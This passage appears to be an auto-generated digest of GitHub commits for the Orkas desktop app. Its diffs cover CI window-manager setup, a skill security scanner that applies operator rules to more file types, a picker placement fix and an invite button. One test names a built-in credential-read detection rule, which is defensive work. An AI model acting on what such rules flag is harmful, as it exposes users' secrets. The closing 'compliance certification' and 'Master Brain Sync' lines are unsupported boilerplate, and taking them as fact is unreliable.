Start Openbox inside the Xvfb session and require its EWMH readiness before platform-native tests. Reap the window manager when the lane exits. Install the desktop tools only when missing.

Both Linux architectures previously passed the first four browser-input cases but failed the real minimized-window setup because the CI display had no window manager. Preserve all five cases, product code, assertions and timeouts.

Validation: shell syntax and diff checks passed locally; actual x64/arm64 verification follows in the PR CI because this host is macOS. Original failed runs are retained.

**File**: `.github/workflows/linux-source-smoke.yml` (modified, +19/-4)
```diff
@@ -49,11 +49,11 @@ jobs:
       - name: Install JavaScript dependencies
         run: npm ci
 
-      - name: Install Xvfb when the runner image does not provide it
+      - name: Install the Linux test desktop when the runner image does not provide it
         run: |
-          if ! command -v xvfb-run >/dev/null 2>&1; then
+          if ! command -v xvfb-run >/dev/null 2>&1 || ! command -v openbox >/dev/null 2>&1 || ! command -v xprop >/dev/null 2>&1; then
             sudo apt-get update
-            sudo apt-get install --yes xvfb
+            sudo apt-get install --yes xvfb openbox x11-utils
           fi
 
       - name: Restore standard read-only system font permissions
@@ -66,7 +66,22 @@ jobs:
         run: node scripts/ensure-dev-dependencies.cjs
 
       - name: Run Linux platform-native test lane
-        run: xvfb-run --auto-servernum npm run test:platform-native
+        run: |
+          xvfb-run --auto-servernum bash -eu -c '
+            openbox --sm-disable &
+            window_manager_pid=$!
+            trap "kill $window_manager_pid 2>/dev/null || true" EXIT
+            # Xvfb supplies a display; minimization requires a ready window manager.
+            for attempt in {1..50}; do
+              kill -0 "$window_manager_pid"
+              if xprop -root _NET_SUPPORTING_WM_CHECK | grep -q "window id # 0x"; then
+                break
+              fi
+              sleep 0.1
+            done
+            xprop -root _NET_SUPPORTING_WM_CHECK | grep -q "window id # 0x"
+            npm run test:platform-native
+          '
 
       - name: Type-check
         run: node node_modules/typescript/bin/tsc --noEmit
```

---

### Incident Patch 11: `577e5c04` (2026-10-01)
**Commit Message**: Merge current main and retain Library picker placement fix



---

### Incident Patch 12: `e939435e` (2026-10-01)
**Commit Message**: fix(quality): honor operator rule scan targets

**File**: `src/main/quality/README.md` (modified, +4/-1)
```diff
@@ -52,7 +52,10 @@ rules as `operatorRules` to `validateSkillFile` / `validateSkillDir` /
 The built-in rules stay the security floor: operator rules are additive only
 — they never suppress, downgrade or rewrite a built-in finding, and a
 colliding id is rejected. Their findings carry `source: 'operator-policy'`.
-Still not a sandbox. Field reference lives in `rules/operator-policy.ts`.
+`appliesTo` scopes operator rules by artifact: `skill_md` means executable
+fenced blocks in `SKILL.md`, `script` means standalone script files,
+`skill_meta` means `_meta.json`, and `agent_json` means an Agent spec. Still
+not a sandbox. Field reference lives in `rules/operator-policy.ts`.
 
 ## Levels
 
```

**File**: `src/main/quality/index.ts` (modified, +13/-7)
```diff
@@ -83,6 +83,11 @@ export function validateSkillFile(args: {
     violations.push(..._scanSkillMd(args.content, args.relpath, {}, true, false, args.operatorRules));
   } else if (kind === 'skill_meta') {
     violations.push(..._scanSkillMeta(args.content));
+    violations.push(..._policyScan(args.operatorRules, {
+      content: args.content,
+      kind: 'skill_meta',
+      field: args.relpath,
+    }));
   } else if (kind === 'script') {
     const scanArgs: RuleScanArgs = {
       content: args.content,
@@ -146,16 +151,16 @@ export function validateSkillDir(
     return _finalize(violations);
   }
 
-  // Walk all other recognized files (scripts).
+  // Walk all other recognized files (scripts and _meta.json policy targets).
   for (const rel of _walkFiles(skillDir, '')) {
     if (rel.toUpperCase() === 'SKILL.MD') continue;
-    if (rel === '_meta.json') continue;
     const kind = detectSkillFileKind(rel);
-    if (kind !== 'script') continue;
+    if (kind !== 'script' && kind !== 'skill_meta') continue;
+    if (kind === 'skill_meta' && !options.operatorRules?.length) continue;
     try {
       const content = fs.readFileSync(path.join(skillDir, rel), 'utf8');
-      const scanArgs: RuleScanArgs = { content, kind: 'script', field: rel };
-      violations.push(...scanRedFlags(scanArgs));
+      const scanArgs: RuleScanArgs = { content, kind, field: rel };
+      if (kind === 'script') violations.push(...scanRedFlags(scanArgs));
       violations.push(..._policyScan(options.operatorRules, scanArgs));
     } catch {
       // unreadable file (binary / permission) — skip; no violation surfaced
@@ -250,7 +255,8 @@ function _policyScan(
   rules: ReadonlyArray<RuleDef> | undefined,
   args: RuleScanArgs,
 ): Violation[] {
-  return scanRuleSet(rules ?? [], args, 'operator-policy');
+  if (!rules?.length) return [];
+  return scanRuleSet(rules, args, 'operator-policy');
 }
 
 function detectSkillFileKind(relpath: string): ScanKind {
@@ -301,7 +307,7 @@ function _scanSkillMd(
       field: `${field}:${block.startLine} (\`\`\`${block.lang})`,
     };
     violations.push(...scanRedFlags(scanArgs));
-    violations.push(..._policyScan(operatorRules, scanArgs));
+    violations.push(..._policyScan(operatorRules, { ...scanArgs, kind: 'skill_md' }));
   }
 
   return violations;
```

**File**: `test/main/quality/operator-policy.test.ts` (modified, +30/-2)
```diff
@@ -3,8 +3,7 @@ import * as fs from 'node:fs';
 import * as os from 'node:os';
 import * as path from 'node:path';
 
-import { validateSkillFile, validateSkillDir } from '../../../src/main/quality';
-import { parseOperatorPolicy } from '../../../src/main/quality/rules/operator-policy';
+import { validateSkillFile, validateSkillDir, parseOperatorPolicy } from '../../../src/main/quality';
 
 type Rules = ReturnType<typeof parseOperatorPolicy>['rules'];
 
@@ -66,6 +65,7 @@ describe('quality › operator policy rules', () => {
     expect(parseOperatorPolicy('{}').errors[0]).toMatch(/"rules" array/);
     const cases: Array<[unknown, RegExp]> = [
       [{ id: 'no_credential_path_read', level: 'LOW', pattern: 'x' }, /collides with a built-in rule/],
+      [{ id: 'other_only', level: 'LOW', pattern: 'x', appliesTo: ['other'] }, /"appliesTo" must be a non-empty array/],
     ];
     for (const [rule, expected] of cases) {
       const parsed = parseOperatorPolicy(JSON.stringify({ rules: [rule] }));
@@ -74,6 +74,34 @@ describe('quality › operator policy rules', () => {
     }
   });
 
+  it('honours skill_md rules on executable blocks and keeps script rules scoped to scripts', () => {
+    const content = md('```bash\necho acme-secret\n```\n');
+    const onlyMd = parseOperatorPolicy(JSON.stringify({ rules: [
+      { id: 'skill_md_only', level: 'MEDIUM', pattern: 'acme-secret', appliesTo: ['skill_md'] }] })).rules;
+    const onlyScript = parseOperatorPolicy(JSON.stringify({ rules: [
+      { id: 'script_only', level: 'MEDIUM', pattern: 'acme-secret', appliesTo: ['script'] }] })).rules;
+
+    expect(validateSkillFile({ relpath: 'SKILL.md', content, operatorRules: onlyMd }).violations)
+      .toEqual(expect.arrayContaining([expect.objectContaining({ rule: 'skill_md_only', source: 'operator-policy' })]));
+    expect(validateSkillFile({ relpath: 'SKILL.md', content, operatorRules: onlyScript }).violations)
+      .not.toEqual(expect.arrayContaining([expect.objectContaining({ rule: 'script_only' })]));
+  });
+
+  it('applies skill_meta rules to file- and directory-level sidecar validation', () => {
+    const content = JSON.stringify({ category: 'acme-secret' });
+    const { rules } = parseOperatorPolicy(JSON.stringify({ rules: [
+      { id: 'meta_secret', level: 'MEDIUM', pattern: 'acme-secret', appliesTo: ['skill_meta'] }] }));
+
+    expect(validateSkillFile({ relpath: '_meta.json', content, operatorRules: rules }).violations)
+      .toEqual(expect.arrayContaining([expect.objectContaining({ rule: 'meta_secret', field: '_meta.json:1' })]));
+
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'quality-op-meta-'));
+    fs.writeFileSync(path.join(dir, 'SKILL.md'), md('No executable content.'));
+    fs.writeFileSync(path.join(dir, '_meta.json'), content);
+    expect(validateSkillDir(dir, { operatorRules: rules }).violations)
+      .toEqual(expect.arrayContaining([expect.objectContaining({ rule: 'meta_secret', field: '_meta.json:1' })]));
+  });
+
   it('scans on-disk scripts, honours appliesTo, and never flips the floor verdict', () => {
     const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'quality-op-'));
     fs.writeFileSync(path.join(dir, 'SKILL.md'), md('See scripts/report.sh.'));
```

---

### Incident Patch 13: `ead95355` (2026-10-01)
**Commit Message**: Merge pull request #96 from CloudTianTian/codex/fix-library-picker-placement-20261001

fix(chat): reposition Library picker after async loading

**File**: `src/renderer/modules/agents.js` (modified, +3/-1)
```diff
@@ -4233,7 +4233,9 @@ function _renderLibraryPickerList(listEl, filterText, anchorId) {
       const picker = document.getElementById('agent-picker');
       if (!picker || picker.style.display === 'none' || _agentPickerTab !== 'library') return;
       const search = document.getElementById('agent-picker-search');
-      _renderLibraryPickerList(listEl, search ? search.value : filterText, anchorId);
+      // Use the shared repaint boundary so placement measures the loaded rows,
+      // not the shorter loading shell that was visible before this response.
+      _renderAgentPickerList(search ? search.value : filterText);
     });
     return;
   }
```

**File**: `test/renderer/agent-picker-cli-entry.test.ts` (modified, +0/-1)
```diff
@@ -134,7 +134,6 @@ describe('agent picker › coding-CLI entry hand-off', () => {
     };
     context.window = context;
     vm.createContext(context);
-    vm.runInContext(extractFunction('_agentsTrackClick'), context);
     vm.runInContext(extractFunction('bindAgentPickers'), context);
     vm.runInContext('bindAgentPickers();', context);
     return { context, cliEntry };
```

**File**: `test/renderer/category-tabs.test.ts` (modified, +73/-0)
```diff
@@ -119,6 +119,79 @@ function loadCategoryRenderers() {
   return { context, el };
 }
 
+describe('Library picker asynchronous placement', () => {
+  function pendingLibrary() {
+    const h = loadCategoryRenderers();
+    const { context, el } = h;
+    const picker = el('agent-picker');
+    const list = el('agent-picker-list');
+    const anchor = el('chat-recipient-chip');
+    picker.style.display = 'flex';
+    picker.dataset.anchorId = 'chat-recipient-chip';
+    anchor.className = 'chat-input-area';
+    anchor.getBoundingClientRect = () => ({ left: 200, right: 320, top: 500, bottom: 620, width: 120, height: 120 });
+    context.window.innerHeight = 680;
+    // Model the loading shell and populated box sizes; production placement
+    // must measure again after the deferred response changes the content.
+    picker.getBoundingClientRect = () => {
+      const naturalHeight = list.innerHTML.includes('data-kind="library"') ? 560 : 120;
+      const height = Math.min(naturalHeight, parseFloat(picker.style.maxHeight) || Infinity);
+      const top = parseFloat(picker.style.top) || 0;
+      return { left: 200, right: 540, top, bottom: top + height, width: 340, height };
+    };
+    let resolveTree!: (value: unknown) => void;
+    const tree = new Promise((resolve) => { resolveTree = resolve; });
+    context.apiFetch = async () => ({ json: () => tree });
+    vm.runInContext('_agentPickerTab = "library"; _renderAgentPickerList("")', context);
+    return {
+      ...h, picker, list,
+      finish: async () => {
+        resolveTree({ ok: true, tree: [
+          { type: 'file', name: 'brief.md', relPath: 'brief.md' },
+          { type: 'file', name: 'notes.md', relPath: 'notes.md' },
+        ] });
+        await vm.runInContext('_pickerLibraryLoading', context);
+      },
+    };
+  }
+
+  it('keeps loaded files above the composer and within the viewport', async () => {
+    const h = pendingLibrary();
+    expect(h.list.innerHTML).toContain('加载中');
+    expect(h.picker.getBoundingClientRect().bottom).toBeLessThan(500);
+
+    await h.finish();
+
+    expect(h.list.innerHTML).toContain('brief.md');
+    expect(h.list.innerHTML).toContain('notes.md');
+    const bounds = h.picker.getBoundingClientRect();
+    expect(bounds.top).toBeGreaterThanOrEqual(12);
+    expect(bounds.bottom).toBeLessThanOrEqual(492);
+    expect(h.picker.dataset.placement).toBe('top');
+  });
+
+  it('uses the current search when files arrive and repositions the result', async () => {
+    const h = pendingLibrary();
+    (h.el('agent-picker-search') as any).value = 'brief';
+    h.context._renderAgentPickerList('brief');
+    await h.finish();
+    expect(h.list.innerHTML).toContain('brief.md');
+    expect(h.list.innerHTML).not.toContain('notes.md');
+    expect(h.picker.getBoundingClientRect().bottom).toBeLessThanOrEqual(492);
+  });
+
+  it.each(['close', 'switch tab'])('does not revive Library after %s while loading', async (action) => {
+    const h = pendingLibrary();
+    if (action === 'close') h.context._closeAgentPicker();
+    else vm.runInContext('_agentPickerTab = "connectors"; _renderAgentPickerList("")', h.context);
+    const content = h.list.innerHTML;
+    const style = { ...h.picker.style };
+    await h.finish();
+    expect(h.list.innerHTML).toBe(content);
+    expect(h.picker.style).toEqual(style);
+  });
+});
+
 describe('agent and skill category tabs', () => {
   it('maps missing and non-registry agent categories to General instead of Unknown', () => {
     const { context, el } = loadCategoryRenderers();
```

---

### Incident Patch 14: `912884d8` (2026-10-01)
**Commit Message**: fix(chat): reposition Library picker after async loading

Repaint deferred Library results through the shared placement boundary so the loaded list stays above the composer. Preserve current search and closed or switched-tab guards. Add four regression cases and remove a stale telemetry-helper dependency from the open-source CLI entry fixture.

Validation: the two new placement checks fail before the fix; all 68 related renderer checks pass afterward. The existing CLI entry fixture initially failed in two cases because its removed telemetry helper was still being loaded; its interaction assertions are unchanged.

**File**: `src/renderer/modules/agents.js` (modified, +3/-1)
```diff
@@ -4233,7 +4233,9 @@ function _renderLibraryPickerList(listEl, filterText, anchorId) {
       const picker = document.getElementById('agent-picker');
       if (!picker || picker.style.display === 'none' || _agentPickerTab !== 'library') return;
       const search = document.getElementById('agent-picker-search');
-      _renderLibraryPickerList(listEl, search ? search.value : filterText, anchorId);
+      // Use the shared repaint boundary so placement measures the loaded rows,
+      // not the shorter loading shell that was visible before this response.
+      _renderAgentPickerList(search ? search.value : filterText);
     });
     return;
   }
```

**File**: `test/renderer/agent-picker-cli-entry.test.ts` (modified, +0/-1)
```diff
@@ -134,7 +134,6 @@ describe('agent picker › coding-CLI entry hand-off', () => {
     };
     context.window = context;
     vm.createContext(context);
-    vm.runInContext(extractFunction('_agentsTrackClick'), context);
     vm.runInContext(extractFunction('bindAgentPickers'), context);
     vm.runInContext('bindAgentPickers();', context);
     return { context, cliEntry };
```

**File**: `test/renderer/category-tabs.test.ts` (modified, +73/-0)
```diff
@@ -119,6 +119,79 @@ function loadCategoryRenderers() {
   return { context, el };
 }
 
+describe('Library picker asynchronous placement', () => {
+  function pendingLibrary() {
+    const h = loadCategoryRenderers();
+    const { context, el } = h;
+    const picker = el('agent-picker');
+    const list = el('agent-picker-list');
+    const anchor = el('chat-recipient-chip');
+    picker.style.display = 'flex';
+    picker.dataset.anchorId = 'chat-recipient-chip';
+    anchor.className = 'chat-input-area';
+    anchor.getBoundingClientRect = () => ({ left: 200, right: 320, top: 500, bottom: 620, width: 120, height: 120 });
+    context.window.innerHeight = 680;
+    // Model the loading shell and populated box sizes; production placement
+    // must measure again after the deferred response changes the content.
+    picker.getBoundingClientRect = () => {
+      const naturalHeight = list.innerHTML.includes('data-kind="library"') ? 560 : 120;
+      const height = Math.min(naturalHeight, parseFloat(picker.style.maxHeight) || Infinity);
+      const top = parseFloat(picker.style.top) || 0;
+      return { left: 200, right: 540, top, bottom: top + height, width: 340, height };
+    };
+    let resolveTree!: (value: unknown) => void;
+    const tree = new Promise((resolve) => { resolveTree = resolve; });
+    context.apiFetch = async () => ({ json: () => tree });
+    vm.runInContext('_agentPickerTab = "library"; _renderAgentPickerList("")', context);
+    return {
+      ...h, picker, list,
+      finish: async () => {
+        resolveTree({ ok: true, tree: [
+          { type: 'file', name: 'brief.md', relPath: 'brief.md' },
+          { type: 'file', name: 'notes.md', relPath: 'notes.md' },
+        ] });
+        await vm.runInContext('_pickerLibraryLoading', context);
+      },
+    };
+  }
+
+  it('keeps loaded files above the composer and within the viewport', async () => {
+    const h = pendingLibrary();
+    expect(h.list.innerHTML).toContain('加载中');
+    expect(h.picker.getBoundingClientRect().bottom).toBeLessThan(500);
+
+    await h.finish();
+
+    expect(h.list.innerHTML).toContain('brief.md');
+    expect(h.list.innerHTML).toContain('notes.md');
+    const bounds = h.picker.getBoundingClientRect();
+    expect(bounds.top).toBeGreaterThanOrEqual(12);
+    expect(bounds.bottom).toBeLessThanOrEqual(492);
+    expect(h.picker.dataset.placement).toBe('top');
+  });
+
+  it('uses the current search when files arrive and repositions the result', async () => {
+    const h = pendingLibrary();
+    (h.el('agent-picker-search') as any).value = 'brief';
+    h.context._renderAgentPickerList('brief');
+    await h.finish();
+    expect(h.list.innerHTML).toContain('brief.md');
+    expect(h.list.innerHTML).not.toContain('notes.md');
+    expect(h.picker.getBoundingClientRect().bottom).toBeLessThanOrEqual(492);
+  });
+
+  it.each(['close', 'switch tab'])('does not revive Library after %s while loading', async (action) => {
+    const h = pendingLibrary();
+    if (action === 'close') h.context._closeAgentPicker();
+    else vm.runInContext('_agentPickerTab = "connectors"; _renderAgentPickerList("")', h.context);
+    const content = h.list.innerHTML;
+    const style = { ...h.picker.style };
+    await h.finish();
+    expect(h.list.innerHTML).toBe(content);
+    expect(h.picker.style).toEqual(style);
+  });
+});
+
 describe('agent and skill category tabs', () => {
   it('maps missing and non-registry agent categories to General instead of Unknown', () => {
     const { context, el } = loadCategoryRenderers();
```

---

### Incident Patch 15: `934064e7` (2026-09-30)
**Commit Message**: Keep local project navigation quiet and expose invitation guidance

Remove the obsolete infinite header shimmer left by local project shell loading while retaining aria-busy. Add an invitation button beside Rename and Delete that reuses the existing commercial membership guide.

Verify both invitation entry points, cancellation without external navigation, no HTTP requests on empty-project entry, and no animated header. Validation: 24 owning unit cases, 19 project E2E scenarios plus the final invitation regression, typechecks and fixed-range boundary checks passed. Negative controls reproduced the missing button and stale loading class.

**File**: `src/renderer/index.html` (modified, +1/-0)
```diff
@@ -685,6 +685,7 @@ <h1 class="project-detail-title" id="project-detail-title"></h1>
                 </div>
               </div>
               <div class="project-detail-actions">
+                <button type="button" class="btn btn-sm" id="project-action-invite" data-i18n="project.menu.invite_members">Invite project members</button>
                 <button type="button" class="btn btn-sm" id="project-action-rename" data-i18n="project.action.rename">Rename</button>
                 <button type="button" class="btn btn-sm btn-danger" id="project-action-delete" data-i18n="project.action.delete">Delete</button>
               </div>
```

**File**: `src/renderer/modules/project-detail.js` (modified, +4/-0)
```diff
@@ -4551,6 +4551,10 @@ function _initProjectDetailBindings() {
     e.stopPropagation();
     _openAddPicker();
   });
+  document.getElementById('project-action-invite')?.addEventListener('click', (e) => {
+    e.stopPropagation();
+    void _showProjectMemberInviteGate();
+  });
   document.getElementById('project-action-rename')?.addEventListener('mousedown', (e) => {
     if (_isProjectDetailRenameMode()) e.preventDefault();
   });
```

**File**: `src/renderer/modules/projects.js` (modified, +0/-1)
```diff
@@ -354,7 +354,6 @@ function primeProjectDetailShell(pid) {
   if (title) title.textContent = project?.name || '';
   if (typeof _refreshUnreadTaskIndicators === 'function') _refreshUnreadTaskIndicators(pid);
   if (content) {
-    content.classList.add('is-loading');
     content.setAttribute('aria-busy', 'true');
   }
 }
```

**File**: `src/renderer/style.css` (modified, +0/-21)
```diff
@@ -19033,27 +19033,6 @@ html[dir="rtl"] :is(pre, code, input[type="email"], input[type="url"]) {
 html[dir="rtl"] .ai-select-item-label { unicode-bidi: plaintext; text-align: start; }
 html[dir="rtl"] .sidebar-search-label { text-align: start; }
 
-.project-detail-content.is-loading .project-detail-header {
-  position: relative;
-}
-
-.project-detail-content.is-loading .project-detail-header::after {
-  content: '';
-  position: absolute;
-  left: 0;
-  right: 0;
-  bottom: -1px;
-  height: 2px;
-  background: linear-gradient(90deg, transparent, var(--primary), transparent);
-  animation: project-detail-loading-slide 1.1s ease-in-out infinite;
-}
-
-@keyframes project-detail-loading-slide {
-  0% { transform: scaleX(0.08); opacity: 0.35; }
-  50% { transform: scaleX(0.72); opacity: 0.9; }
-  100% { transform: scaleX(0.08); opacity: 0.35; }
-}
-
 .chat-input-area.is-project .chat-rich-editor {
   min-height: 64px;
   max-height: 220px;
```

**File**: `test/e2e/projects_e2e_smoke.spec.ts` (modified, +45/-9)
```diff
@@ -64,26 +64,62 @@ async function createProject(orkas: OrkasTestApp, name: string): Promise<void> {
 }
 
 test.describe('projects', () => {
-  test('keeps member invitation visible as a commercial download guide', async ({ orkas }) => {
+  test('keeps member invitation visible as a commercial download guide', async ({ orkas }, testInfo) => {
     const projectName = 'E2E Invite Guide';
-    await createProject(orkas, projectName);
     if (!orkas.page) throw new Error('Orkas renderer is unavailable');
     const page = orkas.page;
+    const rendererRequests: string[] = [];
+    page.on('request', request => {
+      const url = new URL(request.url());
+      if (url.protocol === 'http:' || url.protocol === 'https:') rendererRequests.push(url.origin + url.pathname);
+    });
+    await orkas.electronApp!.evaluate(({ shell, net }) => {
+      const root = globalThis as any;
+      root.__projectInviteExternalUrls = [];
+      root.__projectEntryRequests = [];
+      shell.openExternal = async (url: string) => { root.__projectInviteExternalUrls.push(url); };
+      for (const owner of [root, net]) {
+        const original = owner.fetch;
+        owner.fetch = function (input: any, ...args: any[]) {
+          const url = new URL(typeof input === 'string' ? input : input.url || String(input));
+          root.__projectEntryRequests.push(url.origin + url.pathname);
+          return original.call(this, input, ...args);
+        };
+      }
+    });
+    await createProject(orkas, projectName);
+    await expect(page.locator('#project-detail-content')).toHaveAttribute('aria-busy', 'false');
+    await expect(page.locator('#project-detail-content')).not.toHaveClass(/\bis-loading\b/);
+    expect(await page.locator('#panel-project .project-detail-header').evaluate(header =>
+      getComputedStyle(header, '::after').animationName)).toBe('none');
     const row = page.locator('.project-row', {
       has: page.locator('.project-name', { hasText: projectName }),
     });
+    const guidance = await page.evaluate(() => (globalThis as any).t('project.invite_members.commercial_only'));
+    const inviteLabel = await page.evaluate(() => (globalThis as any).t('project.menu.invite_members'));
+    const headerInvite = page.locator('#panel-project .project-detail-actions').getByRole('button', { name: inviteLabel, exact: true });
+    await expect(headerInvite).toBeVisible();
+    await page.locator('#panel-project').screenshot({ path: testInfo.outputPath('project-member-invite-entry.png') });
+    const cancelGuide = async () => {
+      const dialog = page.locator('.ui-dialog-overlay:visible');
+      await expect(dialog.locator('.ui-dialog-message')).toHaveText(guidance);
+      await expect(dialog.locator('[data-act="ok"]')).toBeVisible();
+      await dialog.locator('[data-act="cancel"]').click();
+      await expect(page.locator('.ui-dialog-overlay:visible')).toHaveCount(0);
+      expect(await orkas.electronApp!.evaluate(() => (globalThis as any).__projectInviteExternalUrls)).toEqual([]);
+      expect(await orkas.electronApp!.evaluate(() => (globalThis as any).__projectEntryRequests)).toEqual([]);
+      expect(rendererRequests).toEqual([]);
+      await expect(page.locator('#project-detail-title')).toHaveText(projectName);
+      await expect(row).toHaveCount(1);
+    };
+    await headerInvite.click();
+    await cancelGuide();
     await row.hover();
     await row.locator('[data-project-menu]').click();
     const invite = page.locator('#project-row-menu [data-action="invite-members"]');
     await expect(invite).toBeVisible();
     await invite.click();
-    const dialog = page.locator('.ui-dialog-overlay:visible');
-    const guidance = await page.evaluate(() => (globalThis as any).t('project.invite_members.commercial_only'));
-    await expect(dialog.locator('.ui-dialog-message')).toHaveText(guidance);
-    await expect(dialog.locator('[data-act="ok"]')).toBeVisible();
-    await dialog.locator('[data-act="cancel"]').click();
-    await expect(page.locator('.ui-dialog-overlay:visible')).toHaveCount(0);
-    await expect(row).toHaveCount(1);
+    await cancelGuide();
   });
 
   test('creates a project and keeps it after an app relaunch', async ({ orkas }) => {
```

**File**: `test/renderer/projects-delete-navigation.test.ts` (modified, +20/-0)
```diff
@@ -261,6 +261,26 @@ describe('project delete navigation', () => {
 });
 
 describe('project create navigation', () => {
+  it('paints the local project shell without a network-style loading animation', () => {
+    const context = loadProjectsRenderer({ afterProjects: [], afterConversations: [] });
+    context.__setProjectsCache([{ project_id: 'p-local', name: 'Local project' }]);
+    const classes = new Set<string>();
+    const attributes = new Map<string, string>();
+    const title = { textContent: '' };
+    const content = {
+      classList: { add: (name: string) => classes.add(name) },
+      setAttribute: (name: string, value: string) => attributes.set(name, value),
+    };
+    context.document.getElementById = (id: string) => id === 'project-detail-title'
+      ? title : id === 'project-detail-content' ? content : null;
+
+    context.primeProjectDetailShell('p-local');
+
+    expect(title.textContent).toBe('Local project');
+    expect(attributes.get('aria-busy')).toBe('true');
+    expect(classes.has('is-loading')).toBe(false);
+  });
+
   it('keeps the last successful project list when a background refresh fails', async () => {
     const cached = [{ project_id: 'p-existing', name: 'Alpha', conv_count: 0 }];
     const context = loadProjectsRenderer({
```

#### Recent Merged Pull Requests:
- **PR #101** (2026-10-03): fix(i18n): simplify CLI badges and complete validation translations (@BlueSkyID666)
- **PR #100** (2026-10-02): Harden and connect operator quality policies (follow-up to #97) (@Orkas-AI)
- **PR #99** (2026-10-02): fix(agents): keep Japanese default and suggested names valid (@YToolbox)
- **PR #98** (2026-10-01): Expand connectors and local project workflows with desktop fixes (@BlueSkyID666)
- **PR #97** (2026-10-02): feat(quality): allow operator-supplied red-flag rules (@Harbor404)
- **PR #96** (2026-10-01): fix(chat): reposition Library picker after async loading (@CloudTianTian)
- **PR #95** (2026-09-30): fix(preview): keep private file details out of failure logs (@BlueSkyID666)
- **PR #93** (2026-09-29): fix(local-agents): exclude system sleep from CLI idle time (@CloudTianTian)

---

## 3. Empirical Evidence & Compliance Certification
- **Evidence Provenance**: Fetched directly from verified official GitHub REST API.
- **Zero Disk Footprint**: 0 bytes of unnecessary repository bloat stored locally.
- **TOS & Free-Tier Adherence**: Request pace complied with public API guidelines without fee, penalty, or unauthorized scraping.

---

## 4. Promotion & Integration Status
- **Status**: HARVESTED_DEEP_FORENSIC
- **Master Brain Sync**: Auto-committed to local/remote Master Brain repository.
